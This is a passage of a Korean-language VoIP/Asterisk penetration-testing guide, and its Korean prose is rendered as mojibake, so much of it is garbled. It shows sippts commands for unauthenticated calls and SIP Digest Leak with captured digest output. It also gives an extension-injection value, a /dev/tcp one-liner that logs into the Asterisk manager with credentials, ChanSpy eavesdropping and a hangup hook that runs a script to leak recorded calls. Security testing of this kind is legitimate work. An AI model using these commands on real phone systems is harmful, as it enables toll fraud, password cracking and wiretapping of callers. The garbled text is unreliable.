**`type=friend`**ë¥¼ ì‚¬ìš©í•  ë•Œ, **host** ë³€ìˆ˜ì˜ **ê°’**ì€ ì‚¬ìš©ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ, ê´€ë¦¬ìê°€ ê·¸ ê°’ì„ ì‚¬ìš©í•˜ì—¬ SIP íŠ¸ë í¬ë¥¼ ì˜ëª» êµ¬ì„±í•˜ë©´ **ëˆ„êµ¬ë‚˜ ì—°ê²°í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ êµ¬ì„±ì€ ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ë¬´ë£Œ í†µí™” / Asterisk ì»¨í…ìŠ¤íŠ¸ ì˜ëª» êµ¬ì„±

Asteriskì—ì„œ **ì»¨í…ìŠ¤íŠ¸**ëŠ” ë‹¤ìŒì„ ê·¸ë£¹í™”í•˜ëŠ” ì´ë¦„ì´ ì§€ì •ëœ ì»¨í…Œì´ë„ˆ ë˜ëŠ” ì„¹ì…˜ìœ¼ë¡œ, ë‹¤ì´ì–¼ í”Œëœì˜ í•µì‹¬ êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤. ë‹¤ì´ì–¼ í”Œëœì€ Asterisk ì‹œìŠ¤í…œì˜ í•µì‹¬ êµ¬ì„± ìš”ì†Œë¡œ, **ë“¤ì–´ì˜¤ëŠ” í†µí™”ì™€ ë‚˜ê°€ëŠ” í†µí™”ê°€ ì²˜ë¦¬ë˜ê³  ê²½ë¡œ ì§€ì •ë˜ëŠ” ë°©ì‹ì„ ì •ì˜**í•©ë‹ˆë‹¤. ì»¨í…ìŠ¤íŠ¸ëŠ” ë‹¤ì´ì–¼ í”Œëœì„ êµ¬ì„±í•˜ê³ , ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ ê´€ë¦¬í•˜ë©°, ì‹œìŠ¤í…œì˜ ì„œë¡œ ë‹¤ë¥¸ ë¶€ë¶„ ê°„ì— ë¶„ë¦¬ë¥¼ ì œê³µí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ê° ì»¨í…ìŠ¤íŠ¸ëŠ” ì¼ë°˜ì ìœ¼ë¡œ **`extensions.conf`** íŒŒì¼ì— ì •ì˜ë©ë‹ˆë‹¤. ì»¨í…ìŠ¤íŠ¸ëŠ” ëŒ€ê´„í˜¸ë¡œ í‘œì‹œë˜ë©°, ì»¨í…ìŠ¤íŠ¸ ì´ë¦„ì´ ê·¸ ì•ˆì— í¬í•¨ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ë©´:
```bash
csharpCopy code[my_context]
```
ë‹¤ì´ì–¼ëœ ë²ˆí˜¸ì˜ íŒ¨í„´ì„ ì •ì˜í•˜ê³  í•´ë‹¹ ë²ˆí˜¸ íŒ¨í„´ê³¼ ì¼ë ¨ì˜ ì‘ì—… ë˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì—°ê²°í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì‘ì—…ì€ í†µí™”ê°€ ì²˜ë¦¬ë˜ëŠ” ë°©ì‹ì„ ê²°ì •í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ì´ ì˜ˆì œëŠ” "my\_context"ë¼ëŠ” ê°„ë‹¨í•œ ì»¨í…ìŠ¤íŠ¸ë¥¼ extension "100"ìœ¼ë¡œ ë³´ì—¬ì¤ë‹ˆë‹¤. ëˆ„êµ°ê°€ê°€ 100ì„ ë‹¤ì´ì–¼í•˜ë©´ í†µí™”ê°€ ë°›ì•„ì§€ê³  í™˜ì˜ ë©”ì‹œì§€ê°€ ì¬ìƒëœ í›„ í†µí™”ê°€ ì¢…ë£Œë©ë‹ˆë‹¤.

ì´ê²ƒì€ **ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸**ë¡œ, **ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ë§Œì•½ ê´€ë¦¬ìê°€ **ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸**ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•œë‹¤ë©´:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ëˆ„êµ¬ë‚˜ **ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ ë  ê²ƒ**ì…ë‹ˆë‹¤ (ê·¸ë¦¬ê³  ì„œë²„ì˜ ê´€ë¦¬ìê°€ í†µí™” ë¹„ìš©ì„ ì§€ë¶ˆí•´ì•¼ í•©ë‹ˆë‹¤).
{% endhint %}

{% hint style="danger" %}
ê²Œë‹¤ê°€, ê¸°ë³¸ì ìœ¼ë¡œ **`sip.conf`** íŒŒì¼ì—ëŠ” **`allowguest=true`**ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë¯€ë¡œ, **ì¸ì¦ ì—†ì´** **ì–´ë–¤** ê³µê²©ìë„ ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS inviteëŠ” **ì¸ì¦ ì—†ì´ í†µí™”ë¥¼ í•  ìˆ˜ ìˆëŠ”ì§€ PBX ì„œë²„ë¥¼ í™•ì¸**í•©ë‹ˆë‹¤. SIP ì„œë²„ê°€ ì˜ëª»ëœ êµ¬ì„±ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ í•´ì¤„ ê²ƒì…ë‹ˆë‹¤. ë˜í•œ í†µí™”ë¥¼ ë‘ ë²ˆì§¸ ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆê²Œ í•´ì¤„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, Asterisk ì„œë²„ì˜ ì˜ëª»ëœ ì»¨í…ìŠ¤íŠ¸ êµ¬ì„±ì´ ìˆë‹¤ë©´, ì¸ì¦ ì—†ì´ INVITE ìš”ì²­ì„ ìˆ˜ë½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ê³µê²©ìëŠ” ì–´ë–¤ ì‚¬ìš©ì/ë¹„ë°€ë²ˆí˜¸ë„ ì•Œì§€ ëª»í•œ ì±„ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ë¬´ë£Œ í†µí™” / ì˜ëª» êµ¬ì„±ëœ IVRS

IVRSëŠ” **ëŒ€í™”í˜• ìŒì„± ì‘ë‹µ ì‹œìŠ¤í…œ(Interactive Voice Response System)**ì„ ë‚˜íƒ€ë‚´ë©°, ì‚¬ìš©ìê°€ ìŒì„± ë˜ëŠ” í„°ì¹˜í†¤ ì…ë ¥ì„ í†µí•´ ì»´í“¨í„°í™”ëœ ì‹œìŠ¤í…œê³¼ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆëŠ” ì „í™” ê¸°ìˆ ì…ë‹ˆë‹¤. IVRSëŠ” ì •ë³´ ì œê³µ, ì „í™” ë¼ìš°íŒ…, ì‚¬ìš©ì ì…ë ¥ ìº¡ì²˜ ë“± ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” **ìë™í™”ëœ í†µí™” ì²˜ë¦¬** ì‹œìŠ¤í…œì„ êµ¬ì¶•í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

VoIP ì‹œìŠ¤í…œì˜ IVRSëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒì„ í¬í•¨í•©ë‹ˆë‹¤:

1. **ìŒì„± í”„ë¡¬í”„íŠ¸(Voice prompts)**: ì‚¬ìš©ìë¥¼ IVR ë©”ë‰´ ì˜µì…˜ ë° ì§€ì‹œì‚¬í•­ì„ í†µí•´ ì•ˆë‚´í•˜ëŠ” ë¯¸ë¦¬ ë…¹ìŒëœ ì˜¤ë””ì˜¤ ë©”ì‹œì§€.
2. **DTMF(Dual-Tone Multi-Frequency) ì‹ í˜¸**: ì „í™”ê¸°ì˜ í‚¤ë¥¼ ëˆŒëŸ¬ ìƒì„±ëœ í„°ì¹˜í†¤ ì…ë ¥ìœ¼ë¡œ, IVR ë©”ë‰´ë¥¼ íƒìƒ‰í•˜ê³  ì…ë ¥ì„ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
3. **í†µí™” ë¼ìš°íŒ…(Call routing)**: ì‚¬ìš©ì ì…ë ¥ì— ê¸°ë°˜í•˜ì—¬ íŠ¹ì • ë¶€ì„œ, ì—ì´ì „íŠ¸ ë˜ëŠ” ë‚´ì„ ê³¼ ê°™ì€ ì ì ˆí•œ ëŒ€ìƒìœ¼ë¡œ ì „í™”ë¥¼ ì—°ê²°í•˜ëŠ” ê²ƒ.
4. **ì‚¬ìš©ì ì…ë ¥ ìº¡ì²˜(User input capture)**: ì „í™”í•˜ëŠ” ì‚¬ëŒìœ¼ë¡œë¶€í„° ê³„ì • ë²ˆí˜¸, ì‚¬ë¡€ ID ë˜ëŠ” ê¸°íƒ€ ê´€ë ¨ ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ê²ƒ.
5. **ì™¸ë¶€ ì‹œìŠ¤í…œê³¼ì˜ í†µí•©(Integration with external systems)**: IVR ì‹œìŠ¤í…œì„ ë°ì´í„°ë² ì´ìŠ¤ ë˜ëŠ” ë‹¤ë¥¸ ì†Œí”„íŠ¸ì›¨ì–´ ì‹œìŠ¤í…œì— ì—°ê²°í•˜ì—¬ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ê±°ë‚˜ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê±°ë‚˜ ì´ë²¤íŠ¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ê²ƒ.

Asterisk VoIP ì‹œìŠ¤í…œì—ì„œëŠ” **`extensions.conf`** íŒŒì¼ê³¼ `Background()`, `Playback()`, `Read()` ë“±ê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ì´ì–¼ í”Œëœì„ ì‚¬ìš©í•˜ì—¬ IVRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì€ ìŒì„± í”„ë¡¬í”„íŠ¸ë¥¼ ì¬ìƒí•˜ê³  ì‚¬ìš©ì ì…ë ¥ì„ ìº¡ì²˜í•˜ë©° í†µí™” íë¦„ì„ ì œì–´í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

#### ì·¨ì•½í•œ êµ¬ì„± ì˜ˆì‹œ
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
ì´ì „ì— ì‚¬ìš©ìê°€ **1ì„ ëˆŒëŸ¬** ë¶€ì„œì— ì „í™”ë¥¼ ê±¸ë¼ê³  ìš”ì²­ë°›ê±°ë‚˜, **2ë¥¼ ëˆŒëŸ¬** ë‹¤ë¥¸ ë¶€ì„œì— ì „í™”ë¥¼ ê±¸ë¼ê³  ìš”ì²­ë°›ê±°ë‚˜, ì•Œê³  ìˆë‹¤ë©´ **ì „í™” ë‚´ì„  ë²ˆí˜¸ë¥¼ ì…ë ¥**í•˜ë¼ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.\
ì·¨ì•½ì ì€ ì§€ì •ëœ **ë‚´ì„  ë²ˆí˜¸ ê¸¸ì´ê°€ í™•ì¸ë˜ì§€ ì•Šì•„ ì‚¬ìš©ìê°€ 5ì´ˆ íƒ€ì„ì•„ì›ƒ ë™ì•ˆ ì „ì²´ ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë©´ í˜¸ì¶œë  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.

### ë‚´ì„  ë²ˆí˜¸ ì£¼ì…

ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì„  ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**ì´ í˜¸ì¶œë  **ë‚´ì„  ë²ˆí˜¸**ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. **ë‚´ì„  101ì´ ì…ë ¥**ë˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì¼ì´ ë°œìƒí•©ë‹ˆë‹¤:
```scss
exten => 101,1,Dial(SIP/101)
```
ê·¸ëŸ¬ë‚˜ **`${EXTEN}`**ì´ ìˆ«ì ì´ìƒì„ ì…ë ¥í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•œë‹¤ë©´ (ì´ì „ Asterisk ë²„ì „ê³¼ ê°™ì´), ê³µê²©ìëŠ” **`101&SIP123123123`**ì„ ì…ë ¥í•˜ì—¬ ì „í™”ë²ˆí˜¸ 123123123ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ì„ ê²ƒì…ë‹ˆë‹¤:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ë”°ë¼ì„œ, ë‚´ì„  **`101`** ë° **`123123123`**ìœ¼ë¡œì˜ í†µí™”ê°€ ì „ì†¡ë˜ë©° í†µí™”ë¥¼ ë°›ëŠ” ì²« ë²ˆì§¸ ë‚´ì„ ë§Œ ì—°ê²°ë©ë‹ˆë‹¤... ê·¸ëŸ¬ë‚˜ ì¼ì¹˜í•˜ëŠ” ë‚´ì„ ì´ ì—†ëŠ” **ë‚´ì„ ì„ ìš°íšŒí•˜ëŠ” ë‚´ì„ **ì„ ì‚¬ìš©í•˜ë©´, **ì›í•˜ëŠ” ë²ˆí˜¸ë¡œë§Œ í†µí™”ë¥¼ ì£¼ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## SIPDigestLeak ì·¨ì•½ì 

SIP Digest LeakëŠ” í•˜ë“œì›¨ì–´ ë° ì†Œí”„íŠ¸ì›¨ì–´ IP ì „í™”ê¸°ë¿ë§Œ ì•„ë‹ˆë¼ ì „í™”ê¸° ì–´ëŒ‘í„°(VoIP to analogue)ë¥¼ í¬í•¨í•œ ë‹¤ìˆ˜ì˜ SIP ì „í™”ê¸°ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ **Digest ì¸ì¦ ì‘ë‹µ ëˆ„ì¶œ**ì„ í—ˆìš©í•˜ë©°, ì´ëŠ” ë¹„ë°€ë²ˆí˜¸ì—ì„œ ê³„ì‚°ë©ë‹ˆë‹¤. **ì˜¤í”„ë¼ì¸ ë¹„ë°€ë²ˆí˜¸ ê³µê²©ì´ ê°€ëŠ¥**í•˜ë©°, ë„ì „ ì‘ë‹µì„ ê¸°ë°˜ìœ¼ë¡œ ëŒ€ë¶€ë¶„ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**[ì—¬ê¸°ì„œ ì·¨ì•½ì  ì‹œë‚˜ë¦¬ì˜¤**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP ì „í™”ê¸°(í”¼í•´ì)ê°€ ì–´ë–¤ í¬íŠ¸(ì˜ˆ: 5060)ì—ì„œ ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì´ë©° ì „í™”ë¥¼ ë°›ìŒ
2. ê³µê²©ìê°€ IP ì „í™”ê¸°ë¡œ INVITEë¥¼ ì „ì†¡
3. í”¼í•´ì ì „í™”ê¸°ê°€ ìš¸ë¦¬ê¸° ì‹œì‘í•˜ê³  ëˆ„êµ°ê°€ ì „í™”ë¥¼ ë°›ì•„ì„œ ëŠìŒ(ìƒëŒ€í¸ì—ì„œ ì „í™”ë¥¼ ë°›ì§€ ì•Šì•„ì„œ)
4. ì „í™”ê°€ ëŠê¸°ë©´ **í”¼í•´ì ì „í™”ê¸°ê°€ ê³µê²©ìì—ê²Œ BYEë¥¼ ì „ì†¡**
5. **ê³µê²©ìê°€ 407 ì‘ë‹µì„ ë°œí–‰**í•˜ê³  **ì¸ì¦ì„ ìš”ì²­**í•˜ë©° ì¸ì¦ ë„ì „ì„ ë°œí–‰
6. **í”¼í•´ì ì „í™”ê¸°ê°€ ë‘ ë²ˆì§¸ BYEì—ì„œ ì¸ì¦ ë„ì „ì— ëŒ€í•œ ì‘ë‹µ**ì„ ì œê³µ
7. **ê³µê²©ìëŠ” ë„ì „ ì‘ë‹µì— ëŒ€í•œ ë¸Œë£¨íŠ¸ í¬ìŠ¤ ê³µê²©**ì„ ìì‹ ì˜ ë¡œì»¬ ë¨¸ì‹ (ë˜ëŠ” ë¶„ì‚° ë„¤íŠ¸ì›Œí¬ ë“±)ì—ì„œ ì‹¤í–‰í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

* [**sippts**](https://github.com/Pepelux/sippts)**ì˜ SIPPTS leak**:** SIPPTS leakëŠ” ë‹¤ìˆ˜ì˜ SIP ì „í™”ê¸°ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” SIP Digest Leak ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤. ê²°ê³¼ë¬¼ì€ SipCrack í˜•ì‹ìœ¼ë¡œ ì €ì¥ë˜ì–´ SIPPTS dcrack ë˜ëŠ” SipCrack ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### í´ë¦­íˆ¬ì½œ

í´ë¦­íˆ¬ì½œì€ **ì›¹ ì‚¬ìš©ì**ê°€ (ì˜ˆë¥¼ ë“¤ì–´ ì œí’ˆì— ê´€ì‹¬ì´ ìˆëŠ” ì‚¬ìš©ì) **ì „í™”ë²ˆí˜¸ë¥¼ ì œê³µ**í•˜ì—¬ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê´‘ê³  ì „í™”ê°€ ê±¸ë¦¬ê³  ì‚¬ìš©ìê°€ **ì „í™”ë¥¼ ë°›ìœ¼ë©´ ì—ì´ì „íŠ¸ì™€ ì—°ê²°ëœ ì „í™”**ê°€ ì‚¬ìš©ìì—ê²Œ ê±¸ë¦½ë‹ˆë‹¤.

ì´ ê¸°ëŠ¥ì— ëŒ€í•œ ì¼ë°˜ì ì¸ Asterisk í”„ë¡œí•„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* ì´ì „ í”„ë¡œí•„ì€ **ì•Œë ¤ì§„ ë¹„ë°€ë²ˆí˜¸ë¡œ ì—°ê²°í•˜ë ¤ëŠ” ëª¨ë“  IP ì£¼ì†Œë¥¼ í—ˆìš©**í•©ë‹ˆë‹¤.
* ì´ì „ì— ëª…ì‹œëœëŒ€ë¡œ **í†µí™”ë¥¼ ì¡°ì§**í•˜ë ¤ë©´ **ì½ê¸° ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•Šìœ¼ë©°** **ì“°ê¸°**ì—ì„œ **ì›ì²œ**ë§Œ í•„ìš”í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ê¶Œí•œìœ¼ë¡œ ì¸í•´ ì•Œë ¤ì§„ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•„ëŠ” ëª¨ë“  IPê°€ ì—°ê²°í•˜ê³  ë„ˆë¬´ ë§ì€ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**ì¶”ê°€ ì •ë³´ë‚˜ ì¡°ì¹˜ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

### **ë„ì²­**

Asteriskì—ì„œëŠ” **`ChanSpy`** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ **ëª¨ë‹ˆí„°ë§í•  ë‚´ì„ (s)**ì„ ì§€ì •í•˜ì—¬ ëŒ€í™”ë¥¼ ë“£ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ë‚´ì„ ì— í• ë‹¹ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, **`exten => 333,1,ChanSpy('all',qb)`**ëŠ” ë§Œì•½ **ë‚´ì„  333**ì„ **í˜¸ì¶œ**í•˜ë©´, **`all`** ë‚´ì„ ì„ **ëª¨ë‹ˆí„°ë§**í•˜ê³ , ìƒˆ ëŒ€í™”ê°€ ì‹œì‘ë  ë•Œë§ˆë‹¤ (**`b`**) ì¡°ìš©í•œ ëª¨ë“œ (**`q`**)ë¡œ ë“£ê¸°ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤. ëŒ€í™”ì—ì„œ ë‹¤ë¥¸ ëŒ€í™”ë¡œ ì´ë™í•˜ë ¤ë©´ **`*`**ë¥¼ ëˆ„ë¥´ê±°ë‚˜ ë‚´ì„  ë²ˆí˜¸ë¥¼ í‘œì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ **`ExtenSpy`**ë¥¼ ì‚¬ìš©í•˜ì—¬ í•œ ë‚´ì„ ë§Œ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ëŒ€í™”ë¥¼ ë“£ëŠ” ëŒ€ì‹ , íŒŒì¼ì— **ë…¹ìŒ**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì„ ì„ ì‚¬ìš©í•˜ì—¬:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

í†µí™”ëŠ” **`/tmp`**ì— ì €ì¥ë©ë‹ˆë‹¤.

Asteriskê°€ ì¢…ë£Œë  ë•Œ í˜¸ì¶œì„ ìœ ì¶œí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed ì·¨ì•½ì 

**RTCPBleed**ì€ 2017ë…„ ë°œí‘œëœ Asterisk ê¸°ë°˜ VoIP ì„œë²„ë¥¼ ì˜í–¥ì„ ì£¼ëŠ” ì£¼ìš” ë³´ì•ˆ ë¬¸ì œì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ **VoIP ëŒ€í™”ë¥¼ ìš´ë°˜í•˜ëŠ” RTP (ì‹¤ì‹œê°„ í”„ë¡œí† ì½œ) íŠ¸ë˜í”½**ì´ **ì¸í„°ë„· ìƒì˜ ëˆ„êµ¬ì— ì˜í•´ ê°€ë¡œì±„ê³  ì¬ì§€ì •ë  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤**. ì´ëŠ” RTP íŠ¸ë˜í”½ì´ NAT (ë„¤íŠ¸ì›Œí¬ ì£¼ì†Œ ë³€í™˜) ë°©í™”ë²½ì„ í†µê³¼í•  ë•Œ ì¸ì¦ì„ ìš°íšŒí•˜ê¸° ë•Œë¬¸ì— ë°œìƒí•©ë‹ˆë‹¤.

RTP í”„ë¡ì‹œëŠ” ë‘ ëª… ì´ìƒì˜ ë‹¹ì‚¬ì ê°„ì˜ RTP ìŠ¤íŠ¸ë¦¼ì„ í”„ë¡ì‹œí•˜ëŠ” ê²ƒìœ¼ë¡œ RTC ì‹œìŠ¤í…œì— ì˜í–¥ì„ ì£¼ëŠ” NAT ì œí•œì„ í•´ê²°í•˜ë ¤ê³  í•©ë‹ˆë‹¤. NATê°€ ì ìš©ëœ ê²½ìš° RTP í”„ë¡ì‹œ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì¢…ì¢… ì‹œê·¸ë„ë§ (ì˜ˆ: SIP)ì„ í†µí•´ ê²€ìƒ‰ëœ RTP IP ë° í¬íŠ¸ ì •ë³´ì— ì˜ì¡´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì—¬ëŸ¬ RTP í”„ë¡ì‹œëŠ” ì´ëŸ¬í•œ **IP ë° í¬íŠ¸ íŠœí”Œì´ ìë™ìœ¼ë¡œ í•™ìŠµë˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì„ êµ¬í˜„**í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì¢…ì¢… ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì„ ê²€ì‚¬í•˜ê³  ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì˜ ì†ŒìŠ¤ IP ë° í¬íŠ¸ë¥¼ ì‘ë‹µí•´ì•¼ í•˜ëŠ” ê²ƒìœ¼ë¡œ í‘œì‹œí•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤. ì´ ë©”ì»¤ë‹ˆì¦˜ì€ "í•™ìŠµ ëª¨ë“œ"ë¼ê³  ë¶ˆë¦´ ìˆ˜ ìˆìœ¼ë©° **ì–´ë– í•œ í˜•íƒœì˜ ì¸ì¦ë„ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ê³µê²©ì**ëŠ” **RTP í”„ë¡ì‹œë¡œ RTP íŠ¸ë˜í”½ì„ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°** RTP ìŠ¤íŠ¸ë¦¼ì˜ í˜¸ì¶œì ë˜ëŠ” í”¼í˜¸ì¶œìë¥¼ ìœ„í•´ ì˜ë„ëœ í”„ë¡ì‹œ RTP íŠ¸ë˜í”½ì„ ìˆ˜ì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ ì·¨ì•½ì ì„ RTP Bleedë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” ê³µê²©ìê°€ í•©ë²•ì ì¸ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ë˜ì–´ì•¼ í•˜ëŠ” RTP ë¯¸ë””ì–´ ìŠ¤íŠ¸ë¦¼ì„ ìˆ˜ì‹ í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

